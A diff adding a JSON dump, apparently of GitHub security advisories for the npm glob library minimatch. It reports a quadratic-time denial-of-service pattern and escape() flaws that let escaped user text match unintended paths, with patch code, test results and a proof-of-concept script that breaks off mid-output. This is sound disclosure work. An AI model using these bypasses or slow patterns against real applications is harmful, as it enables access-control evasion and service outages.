@@ -1,0 +1,1025 @@
+{
+  "source": "https://api.github.com/repos/isaacs/minimatch/security-advisories?per_page=100",
+  "data": [
+    {
+      "ghsa_id": "GHSA-cf2h-pxjq-68xw",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-cf2h-pxjq-68xw",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-cf2h-pxjq-68xw",
+      "summary": "Quadratic compile time for long wildcard patterns (regression in 11.0.0 `mergeRows`)",
+      "description": "**Affected:** minimatch 11.0.0–11.0.6.\n\n**Summary.** `mergeRows()` (`src/index.ts` ~813-852, introduced in 2e1d896) iterates every part position and, for each row with a wildcard there, copies and joins the whole row to build a Map key. For a pattern made of many wildcard-only path parts this is quadratic in the number of parts, even with a single row. It runs in `new Minimatch`, so any uncached pattern pays it.\n\n**Measured** on 11.0.6 with a pattern of `*` parts joined by `/`: 1000 parts 22 ms, 2000 parts 72 ms, 4000 parts 190 ms, 8000 parts 805 ms (about 4× per doubling). Extrapolated to the 64 KB pattern limit (~32,000 parts), one compile blocks for roughly 13 s. A leading brace group of distinct words multiplies the rows and the cost.\n\n**Suggested fix.** Build merge keys incrementally (or hash per position) instead of joining the full row at each position, or skip merging when there is only one row; and count the work against `braceExpandMax` or a new limit.",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "ghsa-fixer[bot]",
+        "id": 350906355,
+        "node_id": "BOT_kgDOFOpn8w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D",
+        "html_url": "https://github.com/apps/ghsa-fixer",
+        "followers_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/followers",
+        "following_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/following{/other_user}",
+        "gists_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/subscriptions",
+        "organizations_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/orgs",
+        "repos_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/repos",
+        "events_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/ghsa-fixer%5Bbot%5D/received_events",
+        "type": "Bot",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-cf2h-pxjq-68xw",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-10T23:05:21Z",
+      "published_at": "2026-11-10T23:05:21Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">= 11.0.0, <= 11.0.6",
+          "patched_versions": "11.0.7",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-407",
+          "name": "Inefficient Algorithmic Complexity"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-407"
+      ],
+      "credits": [
+        {
+          "login": "icguner",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "icguner",
+            "id": 49701492,
+            "node_id": "MDQ6VXNlcjQ5NzAxNDky",
+            "avatar_url": "https://avatars.githubusercontent.com/u/49701492?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/icguner",
+            "html_url": "https://github.com/icguner",
+            "followers_url": "https://api.github.com/users/icguner/followers",
+            "following_url": "https://api.github.com/users/icguner/following{/other_user}",
+            "gists_url": "https://api.github.com/users/icguner/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/icguner/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/icguner/subscriptions",
+            "organizations_url": "https://api.github.com/users/icguner/orgs",
+            "repos_url": "https://api.github.com/users/icguner/repos",
+            "events_url": "https://api.github.com/users/icguner/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/icguner/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-c859-jr93-m5j4",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-c859-jr93-m5j4",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-c859-jr93-m5j4",
+      "summary": "minimatch.escape() output matches more or less than the literal input (leading '!' and '#', backslash collapse under brace expansion, windowsPathsNoEscape + magicalBraces)",
+      "description": "### Summary\n\n`minimatch.escape()` is documented to \"Escape all magic characters in a glob pattern, so that it will only ever match literal strings.\" (README, section `minimatch.escape(pattern, options = {})`). In minimatch 11.0.5 (latest release; `main` is at the `v11.0.5` tag, commit `ea0a4a6`) four classes of input break that contract:\n\n1. A leading `!` is left unescaped. `escape('!secret.txt')` returns `'!secret.txt'`, which is a negated pattern. It matches every path except `secret.txt`, for example `passwd`. This holds in POSIX mode and in `windowsPathsNoEscape` mode.\n2. A leading `#` is left unescaped. `escape('#notes.md')` returns `'#notes.md'`, which is a comment pattern. It matches nothing, including `#notes.md`. This holds in both modes.\n3. An escaped backslash does not survive brace expansion. For the user text `x\\*` (x, backslash, star), `escape()` returns `x\\\\\\*`. Alone, that pattern matches only the literal. When the pattern also contains a brace group, brace-expansion turns `\\\\` back into a single `\\`, so the `*` becomes a live wildcard. The brace group can come from the caller (`escape(u) + '.{js,ts}'`) or, with default options, from the user text itself (`escape('x\\\\*{,}')`).\n4. With `{ windowsPathsNoEscape: true, magicalBraces: true }`, `escape('x{a,b}')` returns `x[{]a,b[}]`. Brace-expansion does not know `[...]` classes and expands it to `x[]a]` and `x[b[]`. The pattern matches `xa` and does not match `x{a,b}`.\n\nThe README documents negation and comments for patterns in general (README lines 484-493). The `escape()` section does not mention them, and its contract (\"only ever match literal strings\") is what callers rely on. The README warns that building a matcher from untrusted user patterns is unsafe. `escape()` is the documented way to make text match only as a literal (README.md:213-214), which is how callers embed untrusted text. These cases are inside that boundary. Behaviors 1 and 3 widen a match (fail open for an allowlist). Behavior 2 empties a match (fail open for a denylist or ignore list). Behavior 4 does both.\n\n### Details\n\nAll line numbers refer to tag `v11.0.5`. brace-expansion line numbers refer to brace-expansion 5.0.12, the version installed under `^5.0.12` at test time, file `dist/commonjs/index.js`.\n\n**Behavior 1: leading `!`.**\n- `src/escape.ts:22-24`: the comment states that `!` needs no escaping because the parens that make extglobs magic are escaped. That is true for `!(...)`. It ignores pattern-level negation.\n- `src/escape.ts:25-32`: none of the four branches escapes `!`. They escape `?*()[]`, plus `\\` in POSIX mode and `{}` with `magicalBraces`. A leading `!` passes through.\n- `src/index.ts:1360-1374` (`parseNegate`, called from `make()` at `src/index.ts:730`): every leading `!` toggles `this.negate` and is stripped. `match()` then inverts the result.\n- `\\!` is already a supported way to write a literal `!`. `test/patterns.js:260` has the entry `['!\\\\!a*', ['a!b', 'd', 'e', '\\\\!a']]`, which excludes `!ab` and `!abc`. The POSIX part of the fix uses that existing syntax, and `unescape()` already reverses it.\n- `test/escape-has-magic.js` checks the `unescape()` round trip and `hasMagic() === false` for every entry in `test/patterns.js`. That list includes `'!a*'` (line 251), `'!\\\\!a*'` (line 260) and `'# ignore this'` (line 327). The test never checks `negate` or `comment`. A negated literal pattern reports `hasMagic() === false`, so the suite passes. Measured on 11.0.5 with the port described under Suggested fix: 811 of 811 upstream assertions pass, and 6 of 784 added `negate`/`comment` assertions fail (`'!a*'`, `'!\\\\!a*'` and `'# ignore this'`, each in POSIX and Windows mode).\n\n**Behavior 2: leading `#`.**\n- `src/escape.ts:25-32`: no branch handles `#`.\n- `src/index.ts:118-120` (`minimatch()` shortcut) and `src/index.ts:719-722` (`make()`): a pattern whose first character is `#` is a comment. `minimatch()` returns `false` and `Minimatch` builds an empty set.\n\n**Behavior 3: escaped backslash collapsed by brace expansion.**\n- `src/escape.ts:28` and `src/escape.ts:32`: a literal `\\` is escaped as `\\\\` and a literal `*` as `\\*`. The user text `x\\*` becomes `x\\\\\\*`.\n- `src/index.ts:733` calls `#expandBraces()`, which reaches `braceExpand()` at `src/index.ts:243-257`. When the pattern contains any `{...}` group, `src/index.ts:256` passes the whole pattern to brace-expansion `expand()`.\n- brace-expansion `index.js:16` (`slashPattern = /\\\\\\\\/g`) and `index.js:54-61` (`escapeBraces`) replace each `\\\\` pair with a sentinel. `index.js:62-69` (`unescapeBraces`, applied to every result at `index.js:125`) turns that sentinel into one `\\` (line 64). `x\\\\\\*.{js,ts}` therefore expands to `x\\\\*.js` and `x\\\\*.ts`. In minimatch syntax that is an escaped backslash followed by a live `*`.\n- With default options, `escape()` leaves `{` and `}` as they are (see the related note below). The user text can then supply the brace group, and the caller appends nothing: `escape('x\\\\*{,}')` returns `x\\\\\\*{,}`, which expands to `x\\\\*` twice and matches `x\\anything`. Commit 0d27f1c, which added `magicalBraces` to `escape()`, states that it resolves #234. Neither that commit nor its tests cover braces that turn an escaped `*` into a wildcard. Its tests in `test/escape-has-magic.js` compare `escape()` and `unescape()` strings only, and none of their inputs contains `*`. With `magicalBraces: true` in POSIX mode the user braces are escaped, so a brace group from the caller is required.\n- The same collapse drops a literal backslash in front of an escaped brace: `escape('\\\\{', { magicalBraces: true }) + '.{js,ts}'` gives `\\\\\\{.{js,ts}`, which does not match `\\{.js` on 11.0.5.\n- The control case without a brace group is correct. The defect is only in the brace-expansion step.\n- A large numeric range such as `{1..5000}` (100 or more values, `src/index.ts:263`) is matched without brace-expansion in 11.0.5, so that suffix alone does not trigger behavior 3.\n\n**Behavior 4: `windowsPathsNoEscape` + `magicalBraces`.**\n- `src/escape.ts:26-27`: in this mode every magic character, including `{` and `}`, is wrapped in a one-character class: `x{a,b}` becomes `x[{]a,b[}]`. The README and the JSDoc at `src/escape.ts:6-10` justify this by saying a character class \"can only be satisfied by that exact character\".\n- `src/index.ts:599-601`: in this mode backslashes are converted to `/` before parsing, so brace-expansion's `\\{` escape is not available to `escape()`.\n- `src/index.ts:251-256`: the brace check regex and brace-expansion both see `{]a,b[}` as a brace set. brace-expansion splits it at the comma into `x[]a]` and `x[b[]`. `hasMagic()` returns `true` and the literal does not match itself.\n\n**Related note (not a numbered behavior): default options leave braces live.**\nWith default options, and with `windowsPathsNoEscape` alone, `escape()` does not escape `{` or `}`. On 11.0.5, `escape('x{a,b}')` returns `x{a,b}`, which matches `xa` and does not match `x{a,b}`. The same holds with `{ windowsPathsNoEscape: true }`. The JSDoc at `src/escape.ts:12-13` says braces are escaped only with `magicalBraces`. The README sentence has no such qualifier. Commit 0d27f1c (\"Support `magicalBraces` option in escape/unescape\") states that it resolves #234. It made brace escaping opt-in and kept the default. The text of issue #234 itself was not read from this environment. This report treats the gap as a documentation issue, and the fix below does not change it. Either the README should state the `magicalBraces` requirement, or the default should escape braces. The bisection shows the gap in every release from 7.4.0 to 11.0.5.\n\n## Suggested fix\n\nTwo parts. Behaviors 1 and 2 are fixed in `src/escape.ts`. Behaviors 3 and 4 cannot be fixed in `escape.ts` alone: every encoding of a literal backslash (`\\\\`, `[\\\\]`) and every class encoding of a brace (`[{]`) is rewritten by brace-expansion. The fix for those belongs in `braceExpand()` in `src/index.ts`, which is the single path to brace-expansion (`#expandBraces()` and all its fallbacks call it).\n\n`src/escape.ts`:\n\n```ts\nexport const escape = (\n  s: string,\n  {\n    windowsPathsNoEscape = false,\n    magicalBraces = false,\n  }: Pick<MinimatchOptions, 'windowsPathsNoEscape' | 'magicalBraces'> = {},\n) => {\n  // Inside the pattern, +@! need no escape because the parens that make\n  // them magic are escaped. At the start of the pattern, '!' negates and\n  // '#' makes a comment, so the first character is handled below.\n  const e =\n    magicalBraces ?\n      windowsPathsNoEscape ?\n        s.replace(/[?*()[\\]{}]/g, '[$&]')\n      : s.replace(/[?*()[\\]\\\\{}]/g, '\\\\$&')\n    : windowsPathsNoEscape ? s.replace(/[?*()[\\]]/g, '[$&]')\n    : s.replace(/[?*()[\\]\\\\]/g, '\\\\$&')\n  const c = e.charAt(0)\n  if (c === '#') {\n    return (windowsPathsNoEscape ? '[#]' : '\\\\#') + e.slice(1)\n  }\n  if (c === '!') {\n    // '[!]' does not work: '[!' opens a negated class. See options (a)\n    // and (b) below for windowsPathsNoEscape mode.\n    return (windowsPathsNoEscape ? '@(!)' : '\\\\!') + e.slice(1)\n  }\n  return e\n}\n```\n\n`src/unescape.ts`, at the top of `unescape()` (option (a) only):\n\n```ts\n  if (windowsPathsNoEscape && s.startsWith('@(!)')) {\n    return '!' + unescape(s.slice(4), { windowsPathsNoEscape, magicalBraces })\n  }\n```\n\n`src/index.ts`, `braceExpand()`, replacing the final `return expand(...)`:\n\n```ts\n  // brace-expansion turns each '\\\\' into '\\'. Double every pair, so an\n  // escaped backslash comes back as '\\\\' and cannot make the next escape\n  // a live magic character.\n  let p = pattern.replace(/\\\\\\\\/g, '\\\\\\\\\\\\\\\\')\n  // brace-expansion does not know [...] classes. In windowsPathsNoEscape\n  // mode escape() writes a literal brace as '[{]' or '[}]'. Escape the\n  // brace inside the class; brace-expansion removes that backslash again.\n  if (options.windowsPathsNoEscape || options.allowWindowsEscape === false) {\n    p = p.replace(/\\[([{}])\\]/g, '[\\\\$1]')\n  }\n  return expand(p, { max: options.braceExpandMax })\n```\n\nWhy this is safe:\n- brace-expansion 5.0.12 matches `\\\\` pairs left to right before it looks at `\\{`, `\\}`, `\\,` and `\\.` (`index.js:54-61`). The doubling regex also works left to right. Each run of backslashes keeps its parity, so a trailing odd backslash still escapes the next character exactly as before. The only change is that `\\\\` now comes back as `\\\\`.\n- The `[\\{]` and `[\\}]` rewrite runs only in `windowsPathsNoEscape` mode. On the `Minimatch` path, `src/index.ts:599-601` has already turned every backslash into `/`, so the inserted backslash is the only one in the string. brace-expansion turns `\\{` back into `{` (`index.js:62-69`), so the result contains `[{]` again.\n- There is no fallback path. The earlier draft of this fix picked two sentinel characters from U+E000..U+F8FF and fell back to the unprotected `expand()` when the input contained all of them. User text could force that fallback. Measured with that earlier `braceExpand()` change applied to 11.0.5: checks 3, 3b, 4 and 4b pass, and P3 and P4 still fail (3 failed assertions; the PoC prints `8 assertion(s) failed` because that build does not include the `escape.ts` change, so checks 1, 1w, 2 and 2w also fail). This version picks no sentinel, so no input can exhaust one, and every pattern goes through the protected path. A fix that does need sentinels must return `[pattern]` (no expansion) when none is free.\n- The doubling depends on brace-expansion's current escape handling. minimatch 11.0.5 requires `^5.0.12`. PoC checks 3 and 3b should become tests so a change in brace-expansion is caught.\n\nWindows mode and a leading `!`: there is no clean encoding. `[!` opens a negated class, and backslash is a path separator in this mode. Measured on 11.0.5 in Windows mode with a trailing `a`: `[!]a`, `[\\!]a`, `[[=!=]]a`, `[[.!.]]a` and `./!a` do not match `!a`, and `[!-!]a` matches `ba` and not `!a`. Only `@(!)a` matches `!a` and nothing else among `!a`, `ba`, `a`, `!`, `b`, and it needs extglob. The two options, with measured trade-offs (port of `test/escape-has-magic.js`, 811 upstream assertions):\n\n| Option | `escape('!a', win)` | PoC | Upstream assertions | Trade-off |\n|---|---|---|---|---|\n| (a) `@(!)` plus the `unescape()` change (shown above) | `@(!)a` | all assertions passed | 804 pass, 7 fail | `hasMagic()` returns `true` for the 7 win32 entries that start with `!` (`'!a*'` twice, `'!!a*'`, `'!\\\\!a*'`, `'!(.a\\|js)@(.*)'`, `'!()y'` twice). Those expectations must change. With `noext: true` the pattern matches neither `!a` nor `b` (fails closed). |\n| (a0) `@(!)` without the `unescape()` change | `@(!)a` | all assertions passed | 797 pass, 14 fail | The same 7 `hasMagic()` failures plus 7 failed win32 `unescape()` round trips. |\n| (b) leave a leading `!` unescaped in Windows mode | `!a` | 1 assertion failed (1w: `passwd` matches) | 811 pass, 0 fail | Behavior 1 remains in Windows mode. Callers must pass `nonegate: true`; with it, `!a` matches `!a` and not `b`. Document this in the README. |\n\n`[#]` for a leading `#` passes the upstream assertions in all three variants. Option (a) is the version verified below.\n\nBehavior change for patterns that do not come from `escape()`: an escaped backslash next to a brace group now stays a literal backslash. On 11.0.5, `{src,lib}/a\\\\b.js` (intended: the literal file `a\\b.js`) expands to `src/a\\b.js` and `lib/a\\b.js`, matches `src/ab.js` and does not match `src/a\\b.js`. With the fix it matches `src/a\\b.js` and not `src/ab.js`. Likewise `a\\\\{b,c}` matched `ab` and now matches `a\\b`. This is a correctness bug fix outside the security scope, but it is visible to users and belongs in the changelog. The public `minimatch.braceExpand()` output changes for the same patterns. No pattern in `test/patterns.js` changes (see the differential below).\n\nLocal verification. The three changes were applied to a fresh copy of the installed 11.0.5 `dist/commonjs` and `dist/esm` files, with unpatched 11.0.5 as the control. Variants a0 and b were tested the same way. The TypeScript above was not compiled. The upstream `tap` suite was not run.\n\n- PoC (`poc.js` above): unpatched 11.0.5 prints `14 assertion(s) failed`. Patched: `all assertions passed`. That covers all 11 checks: 1, 1w, 2, 2w, 3, 3b (user-supplied braces), 3c, 4, 4b, P3 and P4 (the private-use-character fallback bypass).\n- Port of `test/escape-has-magic.js` (the `tap` snapshot is replaced by a comparison of `[set, hasMagic()]` with unpatched 11.0.5):\n\n  | Build | Upstream assertions | Snapshot substitute | Added `negate`/`comment` assertions |\n  |---|---|---|---|\n  | 11.0.5 | 811 pass, 0 fail | 196 of 196 equal | 778 pass, 6 fail |\n  | option (a) | 804 pass, 7 fail | 196 of 196 equal | 784 pass, 0 fail |\n  | option (a0) | 797 pass, 14 fail | 196 of 196 equal | 784 pass, 0 fail |\n  | option (b) | 811 pass, 0 fail | 196 of 196 equal | 782 pass, 2 fail |\n\n  All 7 failures for option (a) are the win32 `hasMagic() === false` assertions listed in the table above.\n- Differential over `test/patterns.js` (unpatched 11.0.5 against option (a)): 196 string patterns, matched against the 135 distinct file names in the expected-result lists of that file. `braceExpand()` output: 196 comparisons, 0 differences. Match results: 26,460 comparisons, 0 differences. The script also escapes every pattern in four modes (POSIX, POSIX + `magicalBraces`, Windows, Windows + `magicalBraces`) and checks that the escaped pattern matches its own literal. In Windows mode the literal is compared with backslashes converted to `/`, because backslash is a path separator in that mode. Unpatched: 15, 6, 15 and 15 misses. Patched: 12, 3, 12 and 3. The patch fixes 21 misses and introduces none. The 30 that remain are the related default-brace note (9 brace entries, 8 distinct patterns because `*(a|{b|c,c})` appears twice in `test/patterns.js`, in POSIX and Windows mode without `magicalBraces`: 18 misses) and 3 patterns with `..` segments in all four modes (12 misses), which is path normalization.\n- Random inputs: 20,000 inputs of 1 to 6 characters over `!#\\*?{},[]()ab.+@-`, with `magicalBraces: true`, POSIX and Windows mode, with and without an appended `.{js,ts}`. Each escaped pattern is checked against its literal and against the probe paths `a`, `ab`, `passwd`, `a.js`, `b.js`, `x` and the empty string. In Windows mode the literal is compared with backslashes converted to `/`, because backslash is a path separator in that mode. In the `.{js,ts}` mode, `.js` is appended to the literal and to each probe path that does not already end in `.js`. A self-miss is a pattern that does not match its literal. An over-match is a pattern that matches at least one probe path.\n\n  | Mode | 11.0.5 self-misses / over-matches | option (a) self-misses / over-matches |\n  |---|---|---|\n  | POSIX | 163 / 2099 | 0 / 0 |\n  | POSIX + `.{js,ts}` | 4516 / 2886 | 0 / 0 |\n  | Windows | 171 / 2107 | 16 / 16 |\n  | Windows + `.{js,ts}` | 163 / 2099 | 0 / 0 |\n\n  The 16 remaining Windows cases are two distinct strings, `@@\\..` and `![\\..`, each generated 8 times. Each case is both a self-miss and an over-match. Both strings end in a backslash followed by `..`, which becomes a `..` path segment. That is path normalization, not escaping.\n\nTests to add:\n- `escape('!x')`, `escape('#x')`, `escape('x\\\\*') + '.{a,b}'`, and `escape('x{a,b}', { windowsPathsNoEscape: true, magicalBraces: true })` must each match the literal and must not match `x`, `a`, or `passwd`.\n- `escape('x\\\\*{,}')` with default options must not match `x\\anything`.\n- `escape('!a', { windowsPathsNoEscape: true })` must match `!a` and not `b`. The `noext: true` behavior must be decided and asserted.\n- Escaped text that contains every character from U+E000 to U+F8FF, plus `.{js,ts}`, must not match a wildcard path.\n- `test/escape-has-magic.js` should assert `negate === false` and `comment === false`. With option (a), its win32 `hasMagic()` expectations for inputs that start with `!` change to `true`.\n\n## Affected versions by behavior\n\nGHSA form field: `>= 7.4.0, <= 11.0.5`. `escape()` first shipped in 7.4.0 (commit `327cb60`). 7.3.0 has no `escape` export. Per behavior:\n\n- Behavior 1 (leading `!`) and behavior 2 (leading `#`): `>= 7.4.0, <= 11.0.5`, no gaps. The brace-expansion version has no effect.\n- Behavior 3 (escaped backslash plus brace group, including 3b): depends on the brace-expansion version that is installed. Vulnerable with brace-expansion 2.x (all 12 releases, 2.0.0 to 2.1.7) and with 5.0.4 to 5.0.12. Not vulnerable with 4.0.0, 4.0.1, 5.0.2, 5.0.3 and `@isaacs/brace-expansion` 5.0.0 and 5.0.1. Those turn `x\\\\\\*.{js,ts}` into `x\\..js` and `x\\..ts`, so even the literal stops matching (fails closed). On a fresh install that gives `>= 7.4.0 < 10.0.0 || 10.0.1 || >= 10.1.3 <= 11.0.5`. 9.0.6 to 9.0.8, 10.1.3 and 10.2.0 to 10.2.4 declare `^5.0.2` and are not affected when a lockfile pins brace-expansion 5.0.2 or 5.0.3. 10.0.0 and 10.0.2 (`^4.x`) and 10.0.3 to 10.1.2 (`@isaacs/brace-expansion ^5.0.x`) are not affected.\n- Behavior 4 (`windowsPathsNoEscape` + `magicalBraces`): `>= 10.1.0, <= 11.0.5`, no gaps. `escape()` gained the `magicalBraces` option in 10.1.0 (commit `0d27f1c`). Before that it returns `x{a,b}` unchanged, which is the related default-brace note, not behavior 4.\n\nBisection: all 50 releases from 7.3.0 to 11.0.5 were installed, each in its own directory with `npm i --ignore-scripts minimatch@V`, and tested in one process per install. Results on a fresh install (B3 and B3b gave the same result in every release):\n\n| minimatch | brace-expansion declared -> installed | B1 | B2 | B3 / B3b | B4 |\n|---|---|---|---|---|---|\n| 7.3.0 | ^2.0.1 -> 2.1.7 | no `escape()` | - | - | - |\n| 7.4.0 - 9.0.5 | ^2.0.1 or ^2.0.2 -> 2.1.7 | yes | yes | yes | option absent |\n| 9.0.6 - 9.0.8 | ^5.0.2 -> 5.0.12 | yes | yes | yes | option absent |\n| 9.0.9 | ^2.0.2 -> 2.1.7 | yes | yes | yes | option absent |\n| 10.0.0 | ^4.0.0 -> 4.0.1 | yes | yes | no (fails closed) | option absent |\n| 10.0.1 | ^2.0.1 -> 2.1.7 | yes | yes | yes | option absent |\n| 10.0.2 | ^4.0.1 -> 4.0.1 | yes | yes | no (fails closed) | option absent |\n| 10.0.3 | @isaacs ^5.0.0 -> 5.0.1 | yes | yes | no (fails closed) | option absent |\n| 10.1.0 - 10.1.2 | @isaacs ^5.0.0 or ^5.0.1 -> 5.0.1 | yes | yes | no (fails closed) | yes |\n| 10.1.3 - 10.2.4 | ^5.0.2 -> 5.0.12 | yes | yes | yes | yes |\n| 10.2.5 - 10.2.6 | ^5.0.5 or ^5.0.8 -> 5.0.12 | yes | yes | yes | yes |\n| 11.0.0 - 11.0.5 | ^5.0.12 -> 5.0.12 | yes | yes | yes | yes |\n\nThe brace-expansion boundary was confirmed with npm `overrides`: minimatch 10.2.0 with brace-expansion 5.0.3 is not affected and with 5.0.4 is affected; 9.0.6 with 5.0.2 is not affected; 7.4.0 with 2.0.1 is affected. Each of the 27 brace-expansion releases that minimatch 7.4.0 to 11.0.5 can resolve (2.0.0 to 2.1.7, 4.0.0, 4.0.1, 5.0.2 to 5.0.12, and `@isaacs/brace-expansion` 5.0.0 and 5.0.1) was also fed `x\\\\\\*.{js,ts}` directly, with the results listed above. No minimatch release declares brace-expansion 3.x, so 3.0.0 to 3.0.9 were not tested.\n\n## Credits\n\nReported by: agntflw\n\n### Proof of concept\n\nSetup: `npm i minimatch@11.0.5`, save the script as `poc.js` in the same directory, then run `node poc.js`. The script has no other dependencies.\n\n```js\n// PoC: minimatch.escape() output that does not match only the literal input.\n// Setup: npm i minimatch@11.0.5   Run: node poc.js\n'use strict'\nconst { minimatch, escape, braceExpand } = require('minimatch')\nconst version = require('minimatch/package.json').version\nconst braceVersion = require('brace-expansion/package.json').version\nconsole.log('minimatch ' + version + ', brace-expansion ' + braceVersion)\n\n// Long inputs are printed as a short form.\nconst PUA = Array.from({ length: 0xf8ff - 0xe000 + 1 }, (_, i) =>\n  String.fromCharCode(0xe000 + i)).join('')\nconst show = s => JSON.stringify(s.split(PUA).join('<U+E000..U+F8FF>'))\n\nlet failures = 0\nfunction check(n, title, user, pattern, opts, cases) {\n  console.log('\\n[' + n + '] ' + title)\n  console.log('    user input : ' + show(user))\n  console.log('    options    : ' + JSON.stringify(opts))\n  console.log('    pattern    : ' + show(pattern))\n  for (const [path, expected] of cases) {\n    const actual = minimatch(path, pattern, opts)\n    const ok = actual === expected\n    if (!ok) failures++\n    console.log('    ' + (ok ? 'ok  ' : 'FAIL') + ' match(' + show(path) +\n      ') expected=' + expected + ' actual=' + actual)\n  }\n}\n\n// 1. Leading '!' is not escaped; the pattern is negated.\n{\n  const user = '!secret.txt'\n  check(1, \"leading '!' becomes negation\", user, escape(user), {}, [\n    ['!secret.txt', true],\n    ['passwd', false],\n    ['.env.production', false],\n  ])\n  const w = { windowsPathsNoEscape: true }\n  check('1w', \"leading '!' becomes negation (windowsPathsNoEscape)\", user,\n    escape(user, w), w, [\n      ['!secret.txt', true],\n      ['passwd', false],\n    ])\n}\n\n// 2. Leading '#' is not escaped; the pattern is a comment.\n{\n  const user = '#notes.md'\n  check(2, \"leading '#' becomes a comment\", user, escape(user), {}, [\n    ['#notes.md', true],\n  ])\n  const w = { windowsPathsNoEscape: true }\n  check('2w', \"leading '#' becomes a comment (windowsPathsNoEscape)\", user,\n    escape(user, w), w, [\n      ['#notes.md', true],\n    ])\n}\n\n// 3. Escaped backslash is collapsed by brace expansion; '*' becomes live.\n{\n  const user = 'x\\\\*' // three characters: x, backslash, star\n  const pattern = escape(user) + '.{js,ts}'\n  check(3, 'escaped backslash collapsed by a caller-added brace group', user,\n    pattern, {}, [\n      ['x\\\\*.js', true],\n      ['x\\\\anything.js', false],\n    ])\n  console.log('    braceExpand: ' + JSON.stringify(braceExpand(pattern)))\n\n  // 3b. Default options leave braces unescaped, so the user text itself\n  // can supply the brace group. The caller appends nothing.\n  const user3b = 'x\\\\*{,}'\n  const p3b = escape(user3b)\n  check('3b', 'escaped backslash collapsed by a user-supplied brace group',\n    user3b, p3b, {}, [\n      ['x\\\\anything', false],\n    ])\n  console.log('    braceExpand: ' + JSON.stringify(braceExpand(p3b)))\n\n  const control = escape(user) + '.js'\n  check('3c', 'control: same input, no brace group', user, control, {}, [\n    ['x\\\\*.js', true],\n    ['x\\\\anything.js', false],\n  ])\n}\n\n// 4. windowsPathsNoEscape + magicalBraces: '[{]' and '[}]' are split by\n// brace expansion.\n{\n  const opts = { windowsPathsNoEscape: true, magicalBraces: true }\n  const user = 'x{a,b}'\n  const pattern = escape(user, opts)\n  check(4, 'windowsPathsNoEscape + magicalBraces: class-wrapped braces expanded',\n    user, pattern, opts, [\n      ['x{a,b}', true],\n      ['xa', false],\n    ])\n  console.log('    braceExpand: ' + JSON.stringify(braceExpand(pattern, opts)))\n  const p4b = pattern + '.{js,ts}'\n  check('4b', 'same, with a caller-added brace group', user, p4b, opts, [\n    ['x{a,b}.js', true],\n    ['xa.js', false],\n  ])\n}\n\n// P. Private-use characters in the user text. A fix that picks sentinel\n// characters from U+E000..U+F8FF must not fall back to the unprotected\n// expansion when the input contains all of them.\n{\n  const user = 'x\\\\*' + PUA\n  const pattern = escape(user) + '.{js,ts}'\n  check('P3', 'behavior 3 with every U+E000..U+F8FF character in the input',\n    user, pattern, {}, [\n      ['x\\\\*' + PUA + '.js', true],\n      ['x\\\\ZZZ' + PUA + '.js', false],\n    ])\n  const opts = { windowsPathsNoEscape: true, magicalBraces: true }\n  const user4 = '{q,b}' + PUA\n  check('P4', 'behavior 4 with every U+E000..U+F8FF character in the input',\n    user4, escape(user4, opts), opts, [\n      ['{q,b}' + PUA, true],\n      ['b' + PUA, false],\n    ])\n}\n\nconsole.log('\\n' + (failures ? failures + ' assertion(s) failed: escape() output did not match only the literal input.' : 'all assertions passed'))\n```\n\nOutput on macOS, Node.js v24.2.0, minimatch 11.0.5, brace-expansion 5.0.12:\n\n```text\n$ node poc.js\nminimatch 11.0.5, brace-expansion 5.0.12\n\n[1] leading '!' becomes negation\n    user input : \"!secret.txt\"\n    options    : {}\n    pattern    : \"!secret.txt\"\n    ok   match(\"!secret.txt\") expected=true actual=true\n    FAIL match(\"passwd\") expected=false actual=true\n    FAIL match(\".env.production\") expected=false actual=true\n\n[1w] leading '!' becomes negation (windowsPathsNoEscape)\n    user input : \"!secret.txt\"\n    options    : {\"windowsPathsNoEscape\":true}\n    pattern    : \"!secret.txt\"\n    ok   match(\"!secret.txt\") expected=true actual=true\n    FAIL match(\"passwd\") expected=false actual=true\n\n[2] leading '#' becomes a comment\n    user input : \"#notes.md\"\n    options    : {}\n    pattern    : \"#notes.md\"\n    FAIL match(\"#notes.md\") expected=true actual=false\n\n[2w] 